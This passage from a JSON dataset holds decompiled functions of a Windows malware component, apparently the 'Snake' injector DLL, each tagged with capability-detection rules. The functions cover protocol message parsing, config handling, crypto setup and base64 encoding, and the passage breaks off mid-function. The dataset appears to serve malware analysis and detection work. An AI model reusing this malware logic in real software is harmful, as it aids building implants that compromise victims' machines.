        "decompiled_code": "\nuint __cdecl fcn.2002c08d(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *arg_8h_00;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *arg_8h_01;\n    int32_t *piVar6;\n    int32_t arg_ch_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar4 = arg_ch;\n    var_8h = 0;\n    iVar1 = arg_10h[1];\n    iVar5 = arg_ch[1];\n    if ((iVar5 == 0) || (iVar1 == 0)) {\n        fcn.20024717(arg_8h, 0);\n        return 1;\n    }\n    arg_ch_00 = iVar1 + iVar5;\n    fcn.20025c2c(arg_14h);\n    if (((arg_8h == arg_ch) || (arg_8h_00 = arg_8h,  arg_8h == arg_10h)) &&\n       (arg_8h_00 = fcn.20025c4b(arg_14h),  arg_8h_00 == NULL)) goto code_r0x2002c313;\n    arg_8h_00[3] = arg_ch[3] ^ arg_10h[3];\n    iVar3 = iVar5 - iVar1;\n    if ((iVar3 == 0) && (iVar5 == 8)) {\n        piVar4 = arg_8h_00;\n        if (arg_8h_00[2] < 0x10) {\n            piVar4 = fcn.2002456e(arg_8h_00, 0x10);\n        }\n        if (piVar4 == NULL) goto code_r0x2002c313;\n        arg_8h_00[1] = 0x10;\n        fcn.20027df4(*arg_8h_00, *arg_ch, *arg_10h);\n    }\n    else if ((iVar5 < 0x10) || (iVar1 < 0x10)) {\ncode_r0x2002c2ab:\n        arg_ch = iVar5;\n        piVar6 = arg_8h_00;\n        if (arg_8h_00[2] < arg_ch_00) {\n            piVar6 = fcn.2002456e(arg_8h_00, arg_ch_00);\n        }\n        if (piVar6 == NULL) goto code_r0x2002c313;\n        arg_8h_00[1] = arg_ch_00;\n        fcn.2002b9a7(*arg_8h_00, *piVar4, arg_ch, *arg_10h, iVar1);\n    }\n    else {\n        if (iVar3 == 1) {\n            if ((*(arg_10h + 4) & 2) != 0) goto code_r0x2002c2ab;\n            if (arg_10h[2] < iVar5) {\n                fcn.2002456e(arg_10h, iVar5);\n            }\n            *(*arg_10h + iVar1 * 4) = 0;\n            arg_ch = iVar5;\n        }\n        else {\n            if (iVar3 == -1) {\n                if ((*(arg_ch + 4) & 2) != 0) goto code_r0x2002c2ab;\n                if (arg_ch[2] < iVar1) {\n                    fcn.2002456e(arg_ch, iVar1);\n                }\n                iVar3 = 0;\n                *(*arg_ch + iVar5 * 4) = 0;\n                iVar5 = iVar5 + 1;\n            }\n            arg_ch = iVar5;\n            iVar5 = arg_ch;\n            if (iVar3 != 0) goto code_r0x2002c2ab;\n        }\n        cVar2 = fcn.2002443e(arg_ch);\n        iVar5 = 1 << (cVar2 - 1U & 0x1f);\n        iVar1 = iVar5 * 2;\n        arg_8h_01 = fcn.20025c4b(arg_14h);\n        if (arg_ch == iVar5) {\n            iVar5 = iVar5 << 2;\n            if (arg_8h_01[2] < iVar5) {\n                fcn.2002456e(arg_8h_01, iVar5);\n            }\n            if (arg_8h_00[2] < iVar5) {\n                fcn.2002456e(arg_8h_00, iVar5);\n            }\n            fcn.2002ba8c(*arg_8h_00, *piVar4, *arg_10h, arg_ch, *arg_8h_01);\n        }\n        else {\n            if (piVar4[2] < iVar1) {\n                fcn.2002456e(piVar4, iVar1);\n            }\n            if (arg_10h[2] < iVar1) {\n                fcn.2002456e(arg_10h, iVar1);\n            }\n            if (arg_8h_01[2] < iVar5 << 3) {\n                fcn.2002456e(arg_8h_01, iVar5 << 3);\n            }\n            if (arg_8h_00[2] < iVar5 << 3) {\n                fcn.2002456e(arg_8h_00, iVar5 << 3);\n            }\n            for (iVar3 = piVar4[1]; iVar3 < iVar1; iVar3 = iVar3 + 1) {\n                *(*piVar4 + iVar3 * 4) = 0;\n            }\n            for (iVar3 = arg_10h[1]; iVar3 < iVar1; iVar3 = iVar3 + 1) {\n                *(*arg_10h + iVar3 * 4) = 0;\n            }\n            fcn.2002bd70(*arg_8h_00, *piVar4, *arg_10h, arg_ch - iVar5, iVar5, *arg_8h_01);\n        }\n        arg_8h_00[1] = arg_ch_00;\n    }\n    if (0 < arg_8h_00[1]) {\n        piVar4 = *arg_8h_00 + -4 + arg_8h_00[1] * 4;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + -1;\n            if (iVar1 != 0) break;\n            arg_8h_00[1] = arg_8h_00[1] + -1;\n        } while (0 < arg_8h_00[1]);\n    }\n    if (arg_8h != arg_8h_00) {\n        fcn.2002466f(arg_8h, arg_8h_00);\n    }\n    var_8h = 1;\ncode_r0x2002c313:\n    fcn.20025c80(arg_14h);\n    return var_8h;\n}\n",
        "token_count": 1618
    },
    "2002c335": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2002c335(uint *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint *arg_8h_01;\n    int32_t arg_10h_00;\n    uint var_8h;\n    uint *var_4h;\n    \n    arg_8h_00 = arg_8h;\n    arg_8h[arg_10h * 2 + -1] = 0;\n    *arg_8h = 0;\n    arg_10h_00 = arg_10h + -1;\n    var_4h = arg_ch;\n    arg_8h_01 = arg_8h + 1;\n    if (0 < arg_10h_00) {\n        var_4h = arg_ch + 1;\n        uVar1 = fcn.200278cb(arg_8h_01, var_4h, arg_10h_00, *arg_ch);\n        arg_8h_01[arg_10h_00] = uVar1;\n        arg_8h_01 = arg_8h + 3;\n    }\n    if (arg_10h != 2 && -1 < arg_10h + -2) {\n        arg_8h = arg_10h + -2;\n        do {\n            arg_10h_00 = arg_10h_00 + -1;\n            arg_8h = arg_8h + -1;\n            uVar1 = fcn.200276fc(arg_8h_01, var_4h + 1, arg_10h_00, *var_4h);\n            arg_8h_01[arg_10h_00] = uVar1;\n            arg_8h_01 = arg_8h_01 + 2;\n            var_4h = var_4h + 1;\n        } while (0 < arg_8h);\n    }\n    fcn.20027c53(arg_8h_00, arg_8h_00, arg_8h_00, arg_10h * 2);\n    fcn.20027a70(arg_14h, arg_ch, arg_10h);\n    fcn.20027c53(arg_8h_00, arg_8h_00, arg_14h, arg_10h * 2);\n    return;\n}\n",
        "token_count": 543
    },
    "2002c3de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2002c3de(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t arg_10h_00;\n    uint32_t *puVar6;\n    bool bVar7;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_10h_00 = arg_10h / 2;\n    if (arg_10h == 4) {\n        fcn.2002ab8f(arg_8h, arg_ch);\n    }\n    else if (arg_10h == 8) {\n        fcn.20029c92(arg_8h, arg_ch);\n    }\n    else if (arg_10h < 0x10) {\n        fcn.2002c335(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        iVar5 = arg_ch + arg_10h_00 * 4;\n        iVar3 = fcn.20024a02(arg_ch, iVar5, arg_10h_00);\n        bVar7 = -1 < iVar3;\n        if (iVar3 < 1) {\n            if (!bVar7) {\n                fcn.20027d43(arg_14h, iVar5, arg_ch, arg_10h_00);\n            }\n        }\n        else {\n            fcn.20027d43(arg_14h, arg_ch, iVar5, arg_10h_00);\n            bVar7 = false;\n        }\n        iVar3 = arg_14h + arg_10h * 8;\n        if (bVar7) {\n            var_4h = arg_14h + arg_10h * 4;\n            sub.ntdll.dll_memset(var_4h, 0, arg_10h_00 << 2);\n        }\n        else {\n            var_4h = arg_14h + arg_10h * 4;\n            fcn.2002c3de(var_4h, arg_14h, arg_10h_00, iVar3);\n        }\n        fcn.2002c3de(arg_8h, arg_ch, arg_10h_00, iVar3);\n        fcn.2002c3de(arg_8h + arg_10h * 4, iVar5, arg_10h_00, arg_14h + arg_10h * 8);\n        iVar3 = fcn.20027c53(arg_14h, arg_8h, arg_8h + arg_10h * 4, arg_10h);\n        iVar4 = fcn.20027d43(var_4h, arg_14h, var_4h, arg_10h);\n        iVar5 = arg_8h + arg_10h_00 * 4;\n        iVar5 = fcn.20027c53(iVar5, iVar5, var_4h, arg_10h);\n        uVar1 = (iVar3 - iVar4) + iVar5;\n        if (uVar1 != 0) {\n            puVar6 = arg_8h + (arg_10h_00 + arg_10h) * 4;\n            uVar2 = *puVar6;\n            *puVar6 = uVar2 + uVar1;\n            if (uVar2 + uVar1 < uVar1) {\n                do {\n                    puVar6 = puVar6 + 1;\n                    uVar1 = *puVar6;\n                    *puVar6 = uVar1 + 1;\n                } while (uVar1 + 1 == 0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 854
    },
    "2002c53b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002c53b(int32_t *arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *arg_14h;\n    uint var_8ch;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    iVar4 = arg_ch[1];\n    if (iVar4 < 1) {\n        arg_8h[1] = 0;\n        return 1;\n    }\n    var_4h = iVar4;\n    fcn.20025c2c(arg_10h);\n    arg_8h_00 = arg_8h;\n    if (arg_ch == arg_8h) {\n        arg_8h_00 = fcn.20025c4b(arg_10h);\n    }\n    arg_8h_01 = fcn.20025c4b(arg_10h);\n    if (arg_8h_01 == NULL) goto code_r0x2002c6b4;\n    iVar4 = iVar4 * 2;\n    piVar3 = arg_8h_00;\n    var_ch = iVar4;\n    if (arg_8h_00[2] < iVar4 + 1) {\n        piVar3 = fcn.2002456e(arg_8h_00, iVar4 + 1);\n    }\n    if (piVar3 == NULL) goto code_r0x2002c6b4;\n    arg_8h[3] = 0;\n    if (var_4h == 4) {\n        fcn.2002ab8f(*arg_8h_00, *arg_ch);\n    }\n    else if (var_4h == 8) {\n        fcn.20029c92(*arg_8h_00, *arg_ch);\n    }\n    else {\n        if (var_4h < 0x10) {\n            arg_14h = &var_8ch;\n        }\n        else {\n            cVar1 = fcn.2002443e(var_4h);\n            iVar2 = 1 << (cVar1 - 1U & 0x1f);\n            if (var_4h == iVar2) {\n                iVar2 = iVar2 << 2;\n                piVar3 = arg_ch;\n                if (arg_ch[2] < iVar2) {\n                    piVar3 = fcn.2002456e(arg_ch, iVar2);\n                }\n                if (piVar3 == NULL) goto code_r0x2002c6b4;\n                piVar3 = arg_8h_01;\n                if (arg_8h_01[2] < iVar2) {\n                    piVar3 = fcn.2002456e(arg_8h_01, iVar2);\n                }\n                if (piVar3 == NULL) goto code_r0x2002c6b4;\n                fcn.2002c3de(*arg_8h_00, *arg_ch, var_4h, *arg_8h_01);\n                iVar4 = var_ch;\n                goto code_r0x2002c689;\n            }\n            piVar3 = arg_8h_01;\n            if (arg_8h_01[2] < iVar4) {\n                piVar3 = fcn.2002456e(arg_8h_01, iVar4);\n            }\n            if (piVar3 == NULL) goto code_r0x2002c6b4;\n            arg_14h = *arg_8h_01;\n        }\n        fcn.2002c335(*arg_8h_00, *arg_ch, var_4h, arg_14h);\n    }\ncode_r0x2002c689:\n    arg_8h_00[1] = iVar4;\n    if ((0 < iVar4) && (*(*arg_8h_00 + -4 + iVar4 * 4) == 0)) {\n        arg_8h_00[1] = iVar4 + -1;\n    }\n    if (arg_8h_00 != arg_8h) {\n        fcn.2002466f(arg_8h, arg_8h_00);\n    }\n    var_8h = 1;\ncode_r0x2002c6b4:\n    fcn.20025c80(arg_10h);\n    return var_8h;\n}\n",
        "token_count": 1029
    },
    "2000130b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2000130b(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_50h;\n    char acStack58 [26];\n    char acStack32 [10];\n    uint var_12h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint s2;\n    \n    uVar1 = arg_ch;\n    var_ch = 0;\n    iVar3 = 0;\n    var_8h = 0;\n    iVar2 = 0;\n    do {\n        *(&var_50h + iVar2) = iVar2 + 'A';\n        acStack58[iVar2] = iVar2 + 'a';\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x1a);\n    iVar2 = 0;\n    do {\n        acStack32[iVar2] = iVar2 + '0';\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 10);\n    var_12h._0_1_ = 0x2b;\n    var_12h._1_1_ = 0x2f;\n    do {\n        arg_ch = (arg_ch >> 0x10 & 0xff00) << 0x10;\n        iVar2 = 0;\n        do {\n            *(&arg_ch + iVar2) = *(var_ch + arg_8h);\n            iVar2 = iVar2 + 1;\n            var_ch = var_ch + 1;\n            if (var_ch == arg_10h) {\n                var_8h = 1;\n                break;\n            }\n        } while (iVar2 < 3);\n        if (0 < iVar2) {\n            s2._0_1_ = *(&var_50h + (arg_ch >> 2 & 0x3f));\n            s2._1_1_ = *(&var_50h + (arg_ch._1_1_ >> 4 | (arg_ch & 3) << 4));\n            s2._2_1_ = *(&var_50h + (arg_ch._2_1_ >> 6 | (arg_ch._1_1_ & 0xf) << 2));\n            s2._3_1_ = *(&var_50h + (arg_ch._2_1_ & 0x3f));\n            if ((iVar2 < 3) && (s2._3_1_ = 0x3d,  iVar2 < 2)) {\n                s2._2_1_ = 0x3d;\n            }\n        }\n        sub.ntdll.dll_memcpy(iVar3 + uVar1, &s2, 4);\n        iVar3 = iVar3 + 4;\n        if (var_8h != 0) {\n            *(iVar3 + uVar1) = 0;\n            return iVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 681
    },
    "2000184f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.2000184f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    while (pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextW,  *0x20046c08 == 1) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10);\n    }\n    if (*0x20046c08 != 2) {\n        *0x20046c08 = 1;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(0x20046c04, 0, 0, 1, 0xf0000000);\n        if ((iVar2 == 0) && (iVar2 = (*pcVar1)(0x20046c04, 0, 0, 1, 0xf0000008),  iVar2 == 0)) {\n            *0x20046c08 = 0;\n            return 0;\n        }\n        *0x20046c08 = 2;\n        return 1;\n    }\n    return 1;\n}\n",
        "token_count": 241
    },
    "20002de0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.20002de0(uint32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_1 < 10) {\n        fcn.20001567(0x20047340);\n        while (iVar1 = *(param_1 * 4 + 0x2004735c),  iVar1 != 0) {\n            iVar2 = fcn.20001644(iVar1 + 0x60);\n            if (iVar2 != 0) {\n                if (param_3 != 2) {\n                    fcn.2000157d(0x20047340);\n                }\n                *in_EAX = iVar1 + 0x60;\n                in_EAX[1] = param_3 == 2;\n                if (param_3 != 2) {\n                    iVar2 = *(iVar1 + 0x2c);\n                    iVar3 = (**(*(iVar1 + 0x44) + 0x14))(*(iVar1 + 0x48), iVar1 + 8, 0x2c, 0);\n                    if (iVar3 == 0) {\n                        if ((*(iVar1 + 0x2c) == iVar2) || (iVar2 = fcn.20002c51(),  iVar2 == 0)) goto code_r0x20002ea0;\n                    }\n                    else {\n                        iVar2 = 3;\n                    }\n                    fcn.20002815();\n                    return iVar2;\n                }\ncode_r0x20002ea0:\n                if (param_2 != NULL) {\n                    *param_2 = iVar1;\n                }\n                return 0;\n            }\n            fcn.2000157d(0x20047340);\n            (*_sym.imp.KERNEL32.dll_Sleep)(10);\n            fcn.20001567(0x20047340);\n        }\n        fcn.2000157d(0x20047340);\n    }\n    return 1;\n}\n",
        "token_count": 469
    },
    "200045f1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.200045f1(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t **arg_18h, uint *arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint uVar5;\n    uint var_118h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint8_t var_ch;\n    uint var_bh;\n    \n    if (arg_14h < 0x15) {\n        return 0x21590064;\n    }\n    sub.ntdll.dll_memcpy(&var_18h, arg_10h, 0x15);\n    pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n    var_18h = (*_sym.imp.WS2_32.dll_ntohl)(var_18h);\n    var_14h = (*pcVar1)(var_14h);\n    var_bh = (*pcVar1)(var_bh);\n    if ((var_14h & 0x80000000) == 0) {\n        if ((var_ch & 1) != 0) {\n            uVar3 = sym.inj_snake_Win32.dll_config_read_uint32(0xb, 0);\n            if (var_14h <= uVar3) {\n                puVar4 = sym.inj_snake_Win32.dll_tr_alloc(arg_8h, 0x10, 0);\n                if (puVar4 != NULL) {\n                    sub.ntdll.dll_memset(puVar4, 0, 0x10);\n                    *puVar4 = uVar3;\n                    uVar3 = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n                    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n                    puVar4[1] = uVar3;\n                    uVar3 = (*pcVar1)(*puVar4);\n                    *puVar4 = uVar3;\n                    uVar3 = (*pcVar1)(puVar4[1]);\n                    puVar4[1] = uVar3;\n                    *arg_18h = puVar4;\n                    *arg_1ch = 0x10;\n                }\n                sym.inj_snake_Win32.dll_snake_log(5, 0, 0x21590202, var_18h, var_14h);\n                return 0x21590202;\n            }\n            sym.inj_snake_Win32.dll_config_write_uint32(0xb, var_14h);\n        }\n        if ((var_10h == '\\x02') && (puVar4 = sym.inj_snake_Win32.dll_tr_alloc(arg_8h, 4, 0),  puVar4 != NULL)) {\n            *puVar4 = var_14h;\n            fcn.200122b5(arg_8h, puVar4);\n        }\n    }\n    else {\n        iVar2 = sym.inj_snake_Win32.dll_config_read_uint32(3, 0);\n        if ((iVar2 != 0) && (iVar2 = fcn.20012290(arg_8h),  iVar2 == 0)) {\n            fcn.20008f29(var_14h & 0x7fffffff, &var_118h);\n        }\n    }\n    uVar5 = fcn.20007972(arg_8h, arg_ch, arg_10h + 0x15, arg_14h - 0x15, arg_18h, arg_1ch, &var_18h, 0);\n    return uVar5;\n}\n",
        "token_count": 837
    },
    "200053f8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.200053f8(uint arg_8h, uint arg_ch, uint32_t size, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t arg_18h;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint s1;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_23h;\n    uint hHandle;\n    uint var_10h;\n    uint var_ch;\n    uint ptr;\n    int32_t var_4h;\n    \n    ptr = 0;\n    var_ch = 0;\n    var_4h = 0;\n    arg_18h = (*_sym.imp.msvcrt.dll_malloc)(size);\n    if (arg_18h == 0) {\n        sym.inj_snake_Win32.dll_snake_log(3, 0, 0x21590004, 0, arg_14h);\n    }\n    else {\n        uVar2 = sym.inj_snake_Win32.dll_config_read_uint32(2, 0);\n        uVar4 = arg_14h;\n        if (uVar2 < arg_14h) {\n            iVar3 = sym.inj_snake_Win32.dll_qm_read(arg_8h, 0, arg_ch, 0, arg_18h, size, &size);\n            if (iVar3 == 0) {\n                if (0x14 < size) {\n                    sub.ntdll.dll_memcpy(&s1, arg_18h, 0x15);\n                    pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n                    s1 = (*_sym.imp.WS2_32.dll_ntohl)(s1);\n                    var_2ch = (*pcVar1)(var_2ch);\n                    var_23h = (*pcVar1)(var_23h);\n                    uVar4 = arg_14h;\n                    if (arg_14h == var_2ch) {\n                        var_10h = 0x20034160;\n                        if ((var_28h == '\\x02') || (var_28h == '\\x01')) {\n                            var_4h = 1;\n                            sym.inj_snake_Win32.dll_qm_rm(arg_8h, 0, arg_ch);\n                        }\n                        sub.ntdll.dll_memset(&hHandle, 0, 8);\n                        fcn.20007972(&var_10h, s1, arg_18h + 0x15, size - 0x15, &ptr, &var_ch, &s1, &hHandle);\n                        if ((var_4h != 0) && (iVar3 = fcn.20001d41(&hHandle),  iVar3 != 0)) {\n                            iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 3600000);\n                            if (iVar3 == 0x102) {\n                                sym.inj_snake_Win32.dll_snake_log(0xc, 0, 0x21590002, s1, var_2ch);\n                            }\n                            fcn.20001d2f(&hHandle);\n                        }\n                        (*_sym.imp.msvcrt.dll_free)(ptr);\n                        sym.inj_snake_Win32.dll_config_write_uint32(2, uVar4);\n                        goto code_r0x20005586;\n                    }\n                }\n                uVar2 = 0x21590064;\n            }\n            else {\n                uVar2 = iVar3 + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            uVar2 = 0x215901f7;\n        }\n        sym.inj_snake_Win32.dll_snake_log(3, 0, uVar2, 0, uVar4);\n    }\ncode_r0x20005586:\n    (*_sym.imp.msvcrt.dll_free)(arg_18h);\n    if (var_4h == 0) {\n        sym.inj_snake_Win32.dll_qm_rm(arg_8h, 0, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 922
    },
    "2000d5f9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000d5f9(int32_t hostlong, uint s2, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint32_t s1;\n    uint var_4h;\n    \n    if (hostlong < 2) {\n        return 1;\n    }\n    if (3 < hostlong) {\n        if (hostlong < 7) {\n            return 1;\n        }\n        if (8 < hostlong) {\n            if (hostlong != 9) {\n                return 1;\n            }\n            if (arg_10h != 8) {\n                return 0;\n            }\n            sub.ntdll.dll_memcpy(&s1, s2, 8);\n            pcVar1 = _sym.imp.WS2_32.dll_htonl;\n            uVar2 = (*_sym.imp.WS2_32.dll_htonl)(var_4h);\n            (*pcVar1)(s1);\n            uVar3 = sub.ntdll.dll__allshl();\n            var_4h = uVar3 >> 0x20;\n            s1 = uVar3 | uVar2;\n            sub.ntdll.dll_memcpy(s2, &s1, 8);\n            return 1;\n        }\n    }\n    if (arg_10h == 4) {\n        sub.ntdll.dll_memcpy(&hostlong, s2, 4);\n        hostlong = (*_sym.imp.WS2_32.dll_htonl)(hostlong);\n        sub.ntdll.dll_memcpy(s2, &hostlong, 4);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 379
    },
    "2000d6c2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000d6c2(int32_t netlong, uint s2, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint32_t s1;\n    uint var_4h;\n    \n    if (netlong < 2) {\n        return 1;\n    }\n    if (3 < netlong) {\n        if (netlong < 7) {\n            return 1;\n        }\n        if (8 < netlong) {\n            if (netlong != 9) {\n                return 1;\n            }\n            if (arg_10h != 8) {\n                return 0;\n            }\n            sub.ntdll.dll_memcpy(&s1, s2, 8);\n            pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n            uVar2 = (*_sym.imp.WS2_32.dll_ntohl)(var_4h);\n            (*pcVar1)(s1);\n            uVar3 = sub.ntdll.dll__allshl();\n            var_4h = uVar3 >> 0x20;\n            s1 = uVar3 | uVar2;\n            sub.ntdll.dll_memcpy(s2, &s1, 8);\n            return 1;\n        }\n    }\n    if (arg_10h == 4) {\n        sub.ntdll.dll_memcpy(&netlong, s2, 4);\n        netlong = (*_sym.imp.WS2_32.dll_ntohl)(netlong);\n        sub.ntdll.dll_memcpy(s2, &netlong, 4);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "2000f3e9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.2000f3e9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t unaff_EBP;\n    uint var_180h;\n    uint var_170h;\n    uint var_168h;\n    uint var_164h;\n    uint s;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_118h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_e0h;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_60h;\n    uint var_54h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x20032478, 0x170);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    puVar1 = *(unaff_EBP + 0xc);\n    if ((puVar1 == NULL) || (*(unaff_EBP + 0x10) == NULL)) goto code_r0x2000f91f;\n    **(unaff_EBP + 0x10) = 0;\n    iVar5 = fcn.2000d9af(unaff_EBP + -0x28, 0x438, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x1c) = iVar5;\n    if (iVar5 == 0) {\n        uVar6 = *(unaff_EBP + -0x28);\n        iVar5 = fcn.2000d881(uVar6, unaff_EBP + 0xf);\n        *(unaff_EBP + -0x1c) = iVar5;\n        if (iVar5 == 0) {\n            *(unaff_EBP + 0xf) = *(unaff_EBP + 0xf) == '\\0';\n            iVar5 = fcn.2000e856(uVar6, unaff_EBP + -0x24);\n            *(unaff_EBP + -0x1c) = iVar5;\n            if (iVar5 == 0) {\n                *(unaff_EBP + -4) = 0;\n                if (*(unaff_EBP + 0xf) == '\\0') {\n                    *(unaff_EBP + -0x20) = 0;\n                    if ((puVar1[1] == 0) && (puVar1[5] == 0)) {\n                        iVar5 = fcn.2000d8f1(uVar6, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x170, 0x10);\n                        *(unaff_EBP + -0x1c) = iVar5;\n                        if (iVar5 == 0) {\n                            